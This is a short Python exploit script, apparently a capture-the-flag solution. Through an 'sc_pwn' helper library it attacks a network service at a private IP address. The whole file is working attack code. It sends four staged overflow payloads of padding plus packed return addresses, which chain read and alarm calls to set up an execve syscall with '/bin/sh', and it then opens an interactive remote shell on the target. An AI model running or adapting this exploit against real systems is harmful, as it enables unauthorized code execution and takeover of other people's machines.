#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.129','port':8080}

addr_vuln           = 0x0804815d
addr_read           = 0x0804811d
addr_alarm          = 0x0804810d
addr_syscall_arg3   = 0x0804813a
addr_buf            = 0x0804920c

str_sh              = '/bin/sh\x00'
syscall_execve      = 0x0b

#==========
def attack(cmn):    
    exploit_st1  = '\x00'*0x20
    exploit_st1 += pack_32(addr_read)
    exploit_st1 += pack_32(addr_vuln)
    exploit_st1 += pack_32(STDIN_FILENO)
    exploit_st1 += pack_32(addr_buf)
    exploit_st1 += pack_32(len(str_sh))

    exploit_st2  = '\x00'*0x20
    exploit_st2 += pack_32(addr_vuln)

    exploit_st3  = '\x00'*0x20
    exploit_st3 += pack_32(addr_alarm)
    exploit_st3 += pack_32(addr_vuln)
    exploit_st3 += pack_32(syscall_execve)

    exploit_st4  = '\x00'*0x20
    exploit_st4 += pack_32(addr_alarm)
    exploit_st4 += pack_32(addr_syscall_arg3)
    exploit_st4 += pack_32(0)
    exploit_st4 += pack_32(addr_buf)

    cmn.read_until('2016!\n')
    cmn.send(exploit_st1)
    cmn.read_until('Good Luck!\n')
    cmn.send(str_sh)

    for i in range(10):
        cmn.send(exploit_st2)
        cmn.read_until('Good Luck!\n')
    
    cmn.send(exploit_st3)
    cmn.read_until('Good Luck!\n')
    cmn.send(exploit_st4)
    raw_input('>>')

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
